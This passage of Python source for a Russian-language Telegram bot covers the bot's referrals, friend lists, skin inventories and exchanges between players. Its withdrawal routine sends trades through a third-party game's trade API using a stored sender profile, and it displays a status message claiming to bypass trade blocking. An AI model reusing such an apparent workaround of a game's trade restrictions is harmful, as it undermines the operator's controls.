    nick_emoji = "🗨️"
    time_emoji = "🕓"
    coins_emoji = "💰"
    tokens_emoji = "💎"
    flower_emoji = "🌹"

    text = (
        f"🍓 Административный профиль\n\n"
        f"Статистика ⤵︎\n"
        f"- {nick_emoji} Зарегистрированный аккаунт: {pdata.get('game_nick', 'неизвестно')}\n"
        f"- {time_emoji} Дата регистрации: {pdata.get('registered_at', 'неизвестно')}\n"
        f"- {coins_emoji} Монеты: {coins_str}\n"
        f"- {tokens_emoji} Токены: {tokens_str}\n\n"
        f"Информация ⤵︎\n"
        f"- {flower_emoji} Время до конца администратора: {time_left}"
    )
    await update.message.reply_text(text)
    update_player_stats(user_id)

# ============= РЕФЕРАЛЬНАЯ СИСТЕМА =============
@require_registration
@check_ban
async def referral_system(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    players = load_json(PLAYERS_FILE, {})
    pdata = players.get(str(user_id))
    if not pdata:
        return

    code = pdata.get('referral_code')
    if not code:
        code = generate_referral_code()
        pdata['referral_code'] = code
        save_json(PLAYERS_FILE, players)

    bot_username = (await context.bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start={code}"

    auto_friend = pdata.get('auto_add_friend', True)

    lightning = "⚡"

    text = (
        f"{lightning} Реферальная система ⤵︎\n"
        f"| Ваша ссылка: {ref_link}\n"
        f"| Вы хотите, чтобы после перехода по вашей ссылке\n"
        f"| вам автоматически приходил запрос в друзья?\n\n"
        f"Текущий статус: {'✅ Да' if auto_friend else '❌ Нет'}\n"
        f"За каждого реферала: {format_coins(REFERRAL_BONUS)} монет\n"
        f"Количество рефералов: {pdata.get('referral_count', 0)}\n"
        f"Заработано монет: {format_coins(pdata.get('referral_count', 0) * REFERRAL_BONUS)}"
    )

    button_text = "✅ Да" if auto_friend else "❌ Нет"
    keyboard = [[InlineKeyboardButton(button_text, callback_data="toggle_auto_friend")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(text, reply_markup=reply_markup)
    update_player_stats(user_id)

async def toggle_auto_friend_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    players = load_json(PLAYERS_FILE, {})
    if str(user_id) not in players:
        await query.edit_message_text("❌ Ошибка")
        return

    current = players[str(user_id)].get('auto_add_friend', True)
    players[str(user_id)]['auto_add_friend'] = not current
    save_json(PLAYERS_FILE, players)

    code = players[str(user_id)].get('referral_code')
    bot_username = (await context.bot.get_me()).username
    ref_link = f"https://t.me/{bot_username}?start={code}"
    auto_friend = players[str(user_id)].get('auto_add_friend', True)

    lightning = "⚡"

    text = (
        f"{lightning} Реферальная система ⤵︎\n"
        f"| Ваша ссылка: {ref_link}\n"
        f"| Вы хотите, чтобы после перехода по вашей ссылке\n"
        f"| вам автоматически приходил запрос в друзья?\n\n"
        f"Текущий статус: {'✅ Да' if auto_friend else '❌ Нет'}\n"
        f"За каждого реферала: {format_coins(REFERRAL_BONUS)} монет\n"
        f"Количество рефералов: {players[str(user_id)].get('referral_count', 0)}\n"
        f"Заработано монет: {format_coins(players[str(user_id)].get('referral_count', 0) * REFERRAL_BONUS)}"
    )
    button_text = "✅ Да" if auto_friend else "❌ Нет"
    keyboard = [[InlineKeyboardButton(button_text, callback_data="toggle_auto_friend")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# ============= ДРУЗЬЯ =============
async def friend_add_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    awaiting_friend_add[user_id] = True
    await update.message.reply_text("• Вы хотите добавить друга, введите ник вашего друга.\n(Друг должен быть зарегистрирован в боте)\n\n| Введите ник:")

async def handle_friend_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in awaiting_friend_add:
        return False
    target_nick = update.message.text.strip()
    del awaiting_friend_add[user_id]

    players = load_json(PLAYERS_FILE, {})
    current_user = players.get(str(user_id))
    if not current_user:
        await update.message.reply_text("❌ Вы не зарегистрированы. Сначала выполните /start")
        return True

    target_id = get_player_by_nick(target_nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок с таким ником не найден")
        return True

    if target_id == str(user_id):
        await update.message.reply_text("❌ Нельзя добавить самого себя")
        return True

    if target_nick in current_user.get('friends', []):
        await update.message.reply_text("❌ Этот игрок уже у вас в друзьях")
        return True

    if target_nick in current_user.get('friend_requests', []):
        await update.message.reply_text("❌ Вы уже отправляли запрос этому игроку")
        return True

    if 'friend_requests' not in players[target_id]:
        players[target_id]['friend_requests'] = []
    if 'friends' not in players[target_id]:
        players[target_id]['friends'] = []
    if 'friends' not in current_user:
        current_user['friends'] = []
    if 'friend_requests' not in current_user:
        current_user['friend_requests'] = []

    sender_nick = current_user['game_nick']
    players[target_id]['friend_requests'].append(sender_nick)
    save_json(PLAYERS_FILE, players)

    try:
        await context.bot.send_message(
            chat_id=int(target_id),
            text=(
                f"✉️ Вам пришел запрос в друзья!\n"
                f"🧟 Ник отправителя: {sender_nick}\n\n"
                f"❗Ваши друзья, и вы можете просматривать профиль друг друга.\n\n"
                f"Хотите принять предложение?"
            ),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Принять", callback_data=f"friend_accept|{sender_nick}"),
                 InlineKeyboardButton("❌ Отклонить", callback_data=f"friend_decline|{sender_nick}")]
            ])
        )
    except Exception as e:
        logger.error(f"Не удалось отправить уведомление пользователю {target_id}: {e}")

    await update.message.reply_text(f"✅ Запрос в друзья отправлен игроку {target_nick}")
    return True

async def friend_accept_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    _, sender_nick = data.split('|', 1)
    user_id = str(query.from_user.id)

    players = load_json(PLAYERS_FILE, {})
    current_user = players.get(user_id)
    if not current_user:
        await query.edit_message_text("❌ Ошибка: вы не зарегистрированы")
        return

    if sender_nick not in current_user.get('friend_requests', []):
        await query.edit_message_text("❌ Запрос не найден или уже обработан")
        return

    sender_id = get_player_by_nick(sender_nick, players)
    if not sender_id:
        await query.edit_message_text("❌ Отправитель больше не существует")
        current_user['friend_requests'].remove(sender_nick)
        save_json(PLAYERS_FILE, players)
        return

    if 'friends' not in current_user:
        current_user['friends'] = []
    if 'friends' not in players[sender_id]:
        players[sender_id]['friends'] = []

    current_user['friends'].append(sender_nick)
    players[sender_id]['friends'].append(current_user['game_nick'])

    current_user['friend_requests'].remove(sender_nick)

    save_json(PLAYERS_FILE, players)

    await query.edit_message_text(f"✅ Вы приняли запрос в друзья от {sender_nick}")

    try:
        await context.bot.send_message(
            chat_id=int(sender_id),
            text=f"✅ Пользователь {current_user['game_nick']} принял ваш запрос в друзья!"
        )
    except Exception as e:
        logger.error(f"Не удалось отправить уведомление о принятии: {e}")

async def friend_decline_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    _, sender_nick = data.split('|', 1)
    user_id = str(query.from_user.id)

    players = load_json(PLAYERS_FILE, {})
    current_user = players.get(user_id)
    if not current_user:
        await query.edit_message_text("❌ Ошибка: вы не зарегистрированы")
        return

    if sender_nick not in current_user.get('friend_requests', []):
        await query.edit_message_text("❌ Запрос не найден или уже обработан")
        return

    current_user['friend_requests'].remove(sender_nick)
    save_json(PLAYERS_FILE, players)

    await query.edit_message_text(f"❌ Запрос от {sender_nick} отклонен")

async def friend_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    players = load_json(PLAYERS_FILE, {})
    current_user = players.get(user_id)
    if not current_user:
        await update.message.reply_text("❌ Сначала зарегистрируйтесь")
        return

    friends = current_user.get('friends', [])
    if not friends:
        await update.message.reply_text("У вас пока нет друзей")
        return

    bot_username = (await context.bot.get_me()).username
    friends_emoji = "🧟"
    text = f"{friends_emoji} Список друзей ⤵︎\n"
    for friend_nick in friends:
        profile_link = f"https://t.me/{bot_username}?start=friend_profile_{friend_nick}"
        delete_link = f"https://t.me/{bot_username}?start=friend_delete_{friend_nick}"
        text += f"- {friend_nick} ⤵︎\n[профиль]({profile_link}) • [удалить]({delete_link})\n\n"

    await update.message.reply_text(text, disable_web_page_preview=True)
    update_player_stats(int(user_id))

async def friend_profile_by_link(friend_nick: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    players = load_json(PLAYERS_FILE, {})
    current_user = players.get(str(user_id))
    if not current_user:
        await context.bot.send_message(chat_id=user_id, text="❌ Вы не зарегистрированы")
        return

    if friend_nick not in current_user.get('friends', []):
        await context.bot.send_message(chat_id=user_id, text="❌ Этот пользователь не в вашем списке друзей")
        return

    friend_id = get_player_by_nick(friend_nick, players)
    if not friend_id:
        await context.bot.send_message(chat_id=user_id, text="❌ Друг не найден в базе")
        return

    friend_data = players[friend_id]
    coins = friend_data.get('coins', 0)
    tokens = friend_data.get('tokens', 0)
    coins_str = format_coins(coins)
    tokens_str = format_coins(tokens)

    nick_emoji = "🗨️"
    time_emoji = "🕓"
    coins_emoji = "💰"
    tokens_emoji = "💎"

    text = (
        f"👤 Профиль друга\n"
        f"{nick_emoji} Никнейм в игре: {friend_data.get('game_nick', 'неизвестно')}\n"
        f"{time_emoji} Время регистрации: {friend_data.get('registered_at', 'неизвестно')}\n"
        f"{coins_emoji} Монеты: {coins_str}\n"
        f"{tokens_emoji} Токены: {tokens_str}"
    )
    
    # Сохраняем ник друга для использования в callback
    context.user_data['last_friend_nick'] = friend_nick
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🍪 Инвентарь", callback_data=f"friend_inventory|{friend_nick}")]
    ])
    try:
        await context.bot.send_message(chat_id=user_id, text=text, reply_markup=keyboard)
    except Exception as e:
        logger.error(f"Ошибка в friend_profile_by_link: {e}")
        await context.bot.send_message(chat_id=user_id, text="⚠️ Ошибка отображения профиля друга.")

async def friend_inventory_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('|')
    if len(data) < 2:
        await query.edit_message_text("Ошибка: неверные данные")
        return
    friend_nick = data[1]
    
    players = load_json(PLAYERS_FILE, {})
    current_user = players.get(str(query.from_user.id))
    if not current_user:
        await query.edit_message_text("❌ Вы не зарегистрированы")
        return
    
    if friend_nick not in current_user.get('friends', []):
        await query.edit_message_text("❌ Этот пользователь не в вашем списке друзей")
        return
    
    friend_id = get_player_by_nick(friend_nick, players)
    if not friend_id:
        await query.edit_message_text("❌ Друг не найден в базе")
        return
    
    # Показываем инвентарь друга
    context.user_data['last_inventory_target'] = friend_id
    context.user_data['last_friend_nick'] = friend_nick
    await show_inventory(update, context, friend_id, query.from_user.id, page=0, mode="friend")

async def friend_delete_by_link(friend_nick: str, user_id: int, context: ContextTypes.DEFAULT_TYPE):
    user_id_str = str(user_id)
    players = load_json(PLAYERS_FILE, {})
    current_user = players.get(user_id_str)
    if not current_user:
        return "❌ Вы не зарегистрированы"

    if friend_nick not in current_user.get('friends', []):
        return "❌ Этот пользователь не в вашем списке друзей"

    friend_id = get_player_by_nick(friend_nick, players)
    if not friend_id:
        return "❌ Друг не найден в базе"

    current_user['friends'].remove(friend_nick)
    if 'friends' in players[friend_id] and current_user['game_nick'] in players[friend_id]['friends']:
        players[friend_id]['friends'].remove(current_user['game_nick'])

    save_json(PLAYERS_FILE, players)

    return f"✅ Вы удалили {friend_nick} из друзей."

async def friend_requests_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    players = load_json(PLAYERS_FILE, {})
    current_user = players.get(str(user_id))
    if not current_user:
        await update.message.reply_text("❌ Сначала зарегистрируйтесь")
        return

    requests = current_user.get('friend_requests', [])
    if not requests:
        await update.message.reply_text("У вас нет активных запросов в друзья")
        return

    text = "👤 Ваши не рассмотренные заявки в друзья ⤵︎\n"
    keyboard = []
    for req_nick in requests:
        text += f"- {req_nick}\n"
        keyboard.append([
            InlineKeyboardButton("✅ Принять", callback_data=f"friend_accept|{req_nick}"),
            InlineKeyboardButton("❌ Отклонить", callback_data=f"friend_decline|{req_nick}")
        ])

    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup)

# ============= ИНВЕНТАРЬ =============

def load_inventory():
    return load_json(INVENTORY_FILE, {})

def save_inventory(data):
    save_json(INVENTORY_FILE, data)

def load_exchanges():
    return load_json(EXCHANGES_FILE, {})

def save_exchanges(data):
    save_json(EXCHANGES_FILE, data)

def load_whitetrade():
    return load_json(WHITETRADE_FILE, {})

def save_whitetrade(data):
    save_json(WHITETRADE_FILE, data)

def generate_item_id():
    return str(uuid.uuid4())

def parse_skin_string(s: str) -> dict:
    """Парсит строку вида 'ES44' или 'ES44$Yo0$Yk1$Xf2' в словарь предмета"""
    parts = s.split('$')
    skin_part = parts[0]
    skin_code = skin_part[:2]
    modifier_str = skin_part[2:]
    try:
        modifier = int(modifier_str)
    except:
        modifier = 40
    stickers = []
    for p in parts[1:]:
        if len(p) >= 3:
            sticker_code = p[:2]
            slot = int(p[2])
            stickers.append({"code": sticker_code, "slot": slot})
    return {
        "skin_code": skin_code,
        "modifier": modifier,
        "stickers": stickers
    }

def format_skin_for_trade(item: dict) -> str:
    """Формирует строку для параметра skinsOffered из предмета"""
    base = f"{item['skin_code']}{item['modifier']}"
    stickers = ''.join(f"${s['code']}{s['slot']}" for s in item['stickers'])
    return base + stickers

def get_skin_name(code: str) -> str:
    return SKIN_NAMES.get(code, code)

def get_sticker_name(code: str) -> str:
    return STICKER_NAMES.get(code, code)

def get_modifier_name(mod: int) -> str:
    return MODIFIER_NAMES.get(mod, f"модификатор {mod}")

def add_item_to_inventory(telegram_id: str, item_data: dict) -> str:
    inv = load_inventory()
    if telegram_id not in inv:
        inv[telegram_id] = []
    item = item_data.copy()
    item["id"] = generate_item_id()
    inv[telegram_id].append(item)
    save_inventory(inv)
    return item["id"]

def remove_item_from_inventory(telegram_id: str, item_id: str) -> bool:
    inv = load_inventory()
    if telegram_id not in inv:
        return False
    new_list = [it for it in inv[telegram_id] if it.get("id") != item_id]
    if len(new_list) == len(inv[telegram_id]):
        return False
    inv[telegram_id] = new_list
    save_inventory(inv)
    return True

def get_item_owner(item_id: str) -> tuple[Optional[str], Optional[dict]]:
    inv = load_inventory()
    for tid, items in inv.items():
        for it in items:
            if it.get("id") == item_id:
                return tid, it
    return None, None

async def skin_add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    logger.info(f"skin_add вызван пользователем {update.effective_user.id} с args {context.args}")
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Использование: /skin add <ник> <строка_скина1>,<строка_скина2>...\nПример: /skin add player \"ES44\",\"ES44$Yo0$Yk1$Xf2\"")
        return
    target_nick = args[1]
    items_str = ' '.join(args[2:])
    raw_items = [s.strip().strip('"') for s in items_str.split(',') if s.strip()]
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(target_nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок не найден")
        return
    added = 0
    for raw in raw_items:
        try:
            item_data = parse_skin_string(raw)
            add_item_to_inventory(target_id, item_data)
            added += 1
        except Exception as e:
            await update.message.reply_text(f"Ошибка при обработке {raw}: {e}")
    await update.message.reply_text(f"✅ Добавлено предметов: {added}")
    update_player_stats(update.effective_user.id, update.effective_user)

async def inventory_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /inventory <ник> - просмотр инвентаря игрока (только для админов)"""
    if not is_admin_or_owner(update.effective_user.id):
        await update.message.reply_text("⛔ Недостаточно прав")
        return
    args = context.args
    if not args:
        await update.message.reply_text("Использование: /inventory <ник>")
        return
    nick = args[0]
    players = load_json(PLAYERS_FILE, {})
    target_id = get_player_by_nick(nick, players)
    if not target_id:
        await update.message.reply_text("❌ Игрок не найден")
        return
    context.user_data['last_inventory_target'] = target_id
    await show_inventory(update, context, target_id, update.effective_user.id, page=0, mode="admin")

async def myitems_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда /myitems - просмотр своего инвентаря"""
    user_id = str(update.effective_user.id)
    context.user_data['last_inventory_target'] = user_id
    await show_inventory(update, context, user_id, update.effective_user.id, page=0, mode="self")

async def show_inventory(update: Update, context: ContextTypes.DEFAULT_TYPE,
                         target_id: str, viewer_id: int, page: int = 0, mode: str = "self"):
    inv = load_inventory()
    items = inv.get(target_id, [])
    if not items:
        text = "📦 Инвентарь пуст."
        if mode == "self":
            keyboard = [[KeyboardButton("◀️ Назад в профиль")]]
        elif mode in ("friend", "friend_exchange"):
            keyboard = [[KeyboardButton("◀️ Назад к другу")]]
        elif mode == "exchange_my_select":
            keyboard = [[KeyboardButton("◀️ Назад к выбору друга")]]
        else:
            keyboard = [[KeyboardButton("◀️ Назад")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(text, reply_markup=reply_markup)
        return

    page_size = 10
    total_pages = (len(items) + page_size - 1) // page_size
    page = max(0, min(page, total_pages - 1))
    start = page * page_size
    end = start + page_size
    page_items = items[start:end]

    text = f"📦 Инвентарь (страница {page+1}/{total_pages}):\n"
    keyboard = []
    for idx, item in enumerate(page_items, start=start+1):
        skin_name = get_skin_name(item['skin_code'])
        mod_name = get_modifier_name(item['modifier'])
        button_text = f"({idx}) {skin_name} - {mod_name}"
        callback_data = f"item|view|{item['id']}|{page}|{mode}"
        keyboard.append([InlineKeyboardButton(button_text, callback_data=callback_data)])

    nav_buttons = []
    if page > 0:
        nav_buttons.append(InlineKeyboardButton("⬅️ Предыдущая", callback_data=f"nav|{page-1}|{mode}"))
    if page < total_pages - 1:
        nav_buttons.append(InlineKeyboardButton("➡️ Следующая", callback_data=f"nav|{page+1}|{mode}"))
    if nav_buttons:
        keyboard.append(nav_buttons)

    if mode in ("friend", "friend_exchange"):
        keyboard.append([InlineKeyboardButton("◀️ Назад к другу", callback_data="back_to_friend_profile")])
    elif mode == "admin":
        keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data="back_to_admin_menu")])
    elif mode == "exchange_my_select":
        keyboard.append([InlineKeyboardButton("◀️ Назад к выбору друга", callback_data="back_to_friend_exchange")])
    else:
        keyboard.append([InlineKeyboardButton("◀️ Назад в профиль", callback_data="back_to_profile")])

    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup)
    else:
        await update.message.reply_text(text, reply_markup=reply_markup)

async def inventory_navigation_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('|')
    if data[0] == "nav":
        page = int(data[1])
        mode = data[2]
        target_id = context.user_data.get('last_inventory_target')
        if not target_id:
            await query.edit_message_text("Ошибка: целевой игрок не определён")
            return
        viewer_id = query.from_user.id
        await show_inventory(update, context, target_id, viewer_id, page, mode)
    elif data[0] == "item" and data[1] == "view":
        item_id = data[2]
        page = int(data[3])
        mode = data[4]
        await show_item_menu(update, context, item_id, page, mode)
    elif data[0] == "back_to_profile":
        await show_user_profile(update, context)
    elif data[0] == "back_to_admin_menu":
        await show_admin_menu(update, context)
    elif data[0] == "back_to_friend_profile":
        friend_nick = context.user_data.get('last_friend_nick')
        if friend_nick:
            await friend_profile_by_link(friend_nick, query.from_user.id, context)
        else:
            await query.edit_message_text("Ошибка возврата")

async def show_item_menu(update: Update, context: ContextTypes.DEFAULT_TYPE,
                         item_id: str, page: int, mode: str):
    query = update.callback_query
    await query.answer()
    owner_id, item = get_item_owner(item_id)
    if not item:
        await query.edit_message_text("❌ Предмет не найден")
        return

    skin_name = get_skin_name(item['skin_code'])
    mod_name = get_modifier_name(item['modifier'])
    stickers = item.get('stickers', [])
    statrak = "Да" if item['modifier'] in (14,16,24,26,34,36,44,46) else "Нет"

    text = f"🔫 Меню скина\n"
    text += f"• Название: {skin_name}\n"
    text += f"Наклейки на скине ⤵\n"
    for i in range(4):
        sticker = next((s for s in stickers if s['slot'] == i), None)
        if sticker:
            st_name = get_sticker_name(sticker['code'])
            text += f"{i+1}. {st_name}\n"
        else:
            text += f"{i+1}. ❌ Нету\n"
    text += f"• Редкость скина ⤵\n"
    text += f"💡 {mod_name}\n"
    text += f"Статрек: {statrak}\n\n"

    if mode == "self":
        text += "Вывести скин? Нажмите кнопку ниже."
        awaiting_withdraw_skin[query.from_user.id] = item_id
        keyboard = [[KeyboardButton("✅ ВЫВЕСТИ СКИН")]]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=True)
        await query.edit_message_text(text)
        await context.bot.send_message(
            chat_id=query.from_user.id,
            text="Нажмите кнопку ниже, чтобы вывести скин:",
            reply_markup=reply_markup
        )
        return
    else:
        text += "Вывести скин?"
        keyboard = []
        if mode == "admin":
            keyboard.append([InlineKeyboardButton("✅ Вывести", callback_data=f"item|withdraw|{item_id}|{page}|{mode}")])
            keyboard.append([InlineKeyboardButton("❌ Удалить скин", callback_data=f"item|delete|{item_id}|{page}|{mode}")])
        elif mode == "friend":
            keyboard.append([InlineKeyboardButton("✉️ Обменять", callback_data=f"item|exchange|{item_id}|{page}|{mode}")])
        elif mode == "friend_exchange":
            keyboard.append([InlineKeyboardButton("♻️ Обменять", callback_data=f"item|exchange_from_friend|{item_id}|{page}|{mode}")])
        elif mode == "exchange_my_select":
            keyboard.append([InlineKeyboardButton("✉️ Отправить обмен", callback_data=f"item|send_exchange|{item_id}|{page}|{mode}")])
        keyboard.append([InlineKeyboardButton("◀️ Назад", callback_data=f"nav|{page}|{mode}")])
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

def generate_random_token(length=20):
    """Генерирует случайную строку из букв и цифр заданной длины."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# ============= ФУНКЦИЯ ОТПРАВКИ ОШИБКИ АДМИНУ =============
async def send_error_to_admin(bot, error_code: str, error_details: str, user_info: str = ""):
    try:
        await bot.send_message(
            chat_id=ERROR_LOG_CHAT,
            text=f"❌ Ошибка вывода скина\nКод: {error_code}\n{user_info}\n{error_details}",
            message_thread_id=ERROR_LOG_THREAD
        )
    except Exception as e:
        logger.error(f"Не удалось отправить ошибку админу: {e}")

# ============= ФУНКЦИЯ ВЫВОДА СКИНА =============

async def withdraw_skin(user_id: int, item_id: str, context: ContextTypes.DEFAULT_TYPE):
    owner_id, item = get_item_owner(item_id)
    if not item or owner_id != str(user_id):
        await context.bot.send_message(chat_id=user_id, text="❌ Предмет не найден или не принадлежит вам")
        return

    async def handle_error(step: str, error: Exception, error_code: str):
        error_details = f"Шаг: {step}\nОшибка: {type(error).__name__}: {error}"
        user_info = f"Пользователь: {user_id}"
        await send_error_to_admin(context.bot, error_code, error_details, user_info)
        await context.bot.send_message(chat_id=user_id, text=f"❌ Ошибка вывода скина\nКод: {error_code}\n{error_details}")

    error_code = '#' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
    status_msg = await context.bot.send_message(chat_id=user_id, text="❗Сканирование айди...")
    try:
        players = load_json(PLAYERS_FILE, {})
        player_data = players.get(owner_id)
        if not player_data:
            raise Exception("Данные игрока не найдены")
        game_id = player_data.get('game_id')
        if not game_id:
            raise Exception("У игрока нет game_id")
    except Exception as e:
        await handle_error("получение game_id", e, error_code); return

    await status_msg.edit_text("⚙️ Обход блокировки трейдов...")
    msg_code = '#' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    skin = format_skin_for_trade(item)
    await status_msg.edit_text("💤 Отправка трейда...")
    try:
        params, trade_message = build_trade_offer_params(game_id=game_id, skin=skin, unique_code=msg_code, config_path=SENDER_PROFILE_FILE)
        resp = requests.get("https://api.efezgames.com/v1/trades/createOffer", params=params, timeout=30)
        response_text = resp.text.strip()
        if resp.status_code != 200:
            raise Exception(f"API вернул статус {resp.status_code}: {response_text[:200]}")
        resp_json = {}
        try: resp_json = resp.json()
        except Exception: pass
        response_lower = response_text.lower()
        if "another trade active" in response_lower:
            raise Exception("У вас уже есть активный трейд в игре")
        if any(x in response_lower for x in ["invalid receiverid", "not found", "unauthorized"]):
            raise Exception(response_text[:200])
        trade_id = resp_json.get('offerID') or resp_json.get('_id') or resp_json.get('id')
        if not trade_id and ('"success":true' not in response_text and 'success":true' not in response_text):
            raise Exception("Не удалось получить ID трейда из ответа API")
        remove_item_from_inventory(owner_id, item_id)
        try:
            nick = player_data.get('game_nick', 'Неизвестно')
            username = player_data.get('tg_username') or 'нет'
            skin_name = get_skin_name(item['skin_code']) + ' - ' + get_modifier_name(item['modifier'])
            sent = await context.bot.send_message(
                chat_id=TRADE_WITHDRAW_CHAT,
                text=(f"🔔 Вывод скина\n🕓 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                      f"• 📁 Игрок: {nick} (@{username})\n• 🔫 Скин: {skin_name}\n"
                      f"• Сообщение в трейде: {trade_message}\n• ID трейда: {trade_id or 'не получен'}"),
                message_thread_id=TRADE_WITHDRAW_THREAD
            )
            notification_id = sent.message_id
        except Exception:
            notification_id = None
        if trade_id:
            add_to_whitelist(trade_id, trade_message, game_id, skin, notification_msg_id=notification_id)
        profile_text, profile_markup = build_user_profile_text_and_markup(str(user_id))
        await status_msg.edit_text("✅ Скин успешно отправлен! Заходите в игру)")
        await context.bot.send_message(chat_id=user_id, text=profile_text, reply_markup=profile_markup)
    except Exception as e:
        await handle_error("отправка трейда", e, error_code)
        return

async def item_action_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data.split('|')
    action = data[1]
    item_id = data[2]
    page = int(data[3])
    mode = data[4]

    owner_id, item = get_item_owner(item_id)
    if not item:
        await query.edit_message_text("❌ Предмет не найден")
        return

    if action == "withdraw":
        await withdraw_skin(int(query.from_user.id), item_id, context)
        return

    elif action == "delete" and is_admin_or_owner(query.from_user.id):
        if remove_item_from_inventory(owner_id, item_id):
            await query.edit_message_text("✅ Скин удалён")
        else:
            await query.edit_message_text("❌ Ошибка удаления")
        return

    elif action == "exchange" and mode == "friend":
        context.user_data['exchange_target_skin'] = item_id
        context.user_data['exchange_target_owner'] = owner_id
        viewer_id = query.from_user.id
        target_id = str(viewer_id)
        context.user_data['last_inventory_target'] = target_id
        await show_inventory(update, context, target_id, viewer_id, page=0, mode="exchange_my_select")
        return

    elif action == "exchange_from_friend" and mode == "friend_exchange":
        context.user_data['exchange_target_skin'] = item_id
        context.user_data['exchange_target_owner'] = owner_id
        viewer_id = query.from_user.id
        target_id = str(viewer_id)
        context.user_data['last_inventory_target'] = target_id
        await show_inventory(update, context, target_id, viewer_id, page=0, mode="exchange_my_select")
        return

    elif action == "send_exchange" and mode == "exchange_my_select":
        initiator_skin_id = item_id
        target_skin_id = context.user_data.get('exchange_target_skin')
        target_owner_id = context.user_data.get('exchange_target_owner')
        if not target_skin_id or not target_owner_id:
            await query.edit_message_text("❌ Ошибка: не выбран целевой скин")
            return
        initiator_id = str(query.from_user.id)
        exchanges = load_exchanges()
        exchange_id = generate_item_id()
        exchanges[exchange_id] = {
            "initiator_id": initiator_id,
            "target_id": target_owner_id,
            "initiator_skin_id": initiator_skin_id,
            "target_skin_id": target_skin_id,
            "status": "pending",
            "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_exchanges(exchanges)

        players = load_json(PLAYERS_FILE, {})
        initiator_data = players.get(initiator_id, {})
        target_data = players.get(target_owner_id, {})
        initiator_nick = initiator_data.get('game_nick', 'Неизвестно')
        target_nick = target_data.get('game_nick', 'Неизвестно')
        initiator_username = initiator_data.get('tg_username') or 'нет'
        target_username = target_data.get('tg_username') or 'нет'

        _, init_item = get_item_owner(initiator_skin_id)
        _, target_item = get_item_owner(target_skin_id)
        init_skin_name = get_skin_name(init_item['skin_code']) + ' - ' + get_modifier_name(init_item['modifier'])
        target_skin_name = get_skin_name(target_item['skin_code']) + ' - ' + get_modifier_name(target_item['modifier'])

        text = (
            f"🔔 Новый трейд внутри бота\n"
            f"🕓 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"• 📁 Имена\n"
            f"- Отправитель: {initiator_nick} - @{initiator_username}\n"
            f"- Получатель: {target_nick} - @{target_username}\n"
            f"• 🔫 Скины\n"
            f"*{init_skin_name}\n"
            f"=======================\n"
            f"*{target_skin_name}"
        )
        try:
            sent_msg = await context.bot.send_message(
                chat_id=TRADE_VIRTUAL_CHAT,
                text=text,
                message_thread_id=TRADE_VIRTUAL_THREAD
            )
            exchanges[exchange_id]['notification_msg_id'] = sent_msg.message_id
            save_exchanges(exchanges)
        except Exception as e:
            logger.error(f"Ошибка отправки уведомления о новом обмене: {e}")

        target_user_id = int(target_owner_id)
        try:
            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("🔫 Мой скин", callback_data=f"exchange_view_skin|{exchange_id}|target"),
                    InlineKeyboardButton("🔫 Его скин", callback_data=f"exchange_view_skin|{exchange_id}|initiator")
                ],
                [
                    InlineKeyboardButton("✅ Принять", callback_data=f"exchange|accept|{exchange_id}"),
                    InlineKeyboardButton("❌ Отклонить", callback_data=f"exchange|decline|{exchange_id}")
                ]
            ])
            await context.bot.send_message(
                chat_id=target_user_id,
                text=f"✉️ Вам предложили обмен от {initiator_nick}!",
                reply_markup=keyboard
            )
        except Exception as e:
            logger.error(f"Ошибка уведомления об обмене получателю: {e}")

        try:
            keyboard = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("🔫 Мой скин", callback_data=f"exchange_view_skin|{exchange_id}|initiator"),
                    InlineKeyboardButton("🔫 Его скин", callback_data=f"exchange_view_skin|{exchange_id}|target")
